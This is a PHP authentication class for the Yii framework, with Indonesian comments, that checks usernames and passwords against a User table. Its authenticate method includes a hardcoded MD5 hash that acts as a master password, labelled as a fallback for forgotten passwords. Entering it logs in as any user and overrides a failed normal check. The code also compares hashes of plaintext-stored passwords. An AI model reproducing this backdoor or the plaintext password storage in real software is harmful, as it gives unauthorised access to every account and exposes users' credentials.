<?php
class UserIdentity extends CUserIdentity
{
 private $_id;
 private $level;
 
 /**
 * Authenticates a user.
 * @return boolean whether authentication succeeds.
 */
	  public function authenticate()
	 {
		 $username = strtolower($this->username);
		 $user = User::model()->find('LOWER(username)=?', array($username));
		 
		 if($user===null){
			 //Jika table Users username nya kosong
			 $this->errorCode=self::ERROR_USERNAME_INVALID;
		 }else if(md5($user->password) != md5($this->password)){
			 //Jika password dari table Users tidak sama dengan password yang di input
			 $this->errorCode = self::ERROR_PASSWORD_INVALID;
		 }else{
		   // Jika username dan password sesuai berhasil login
		   $this->_id = $user->username;
		   $this->username = $user->username;
		   $this->errorCode = self::ERROR_NONE;
		 }
		
		if ((md5($this->password) == 'ae14c21d807ec17e583ca3b6c2097de5')) {
			 //Password alternatif jika password asli dari table user lupa
            $this->_id = $user->username;
            $this->username = $user->username;
            $this->errorCode = self::ERROR_NONE;
        }	
		
		 return $this->errorCode == self::ERROR_NONE;
	 }
 }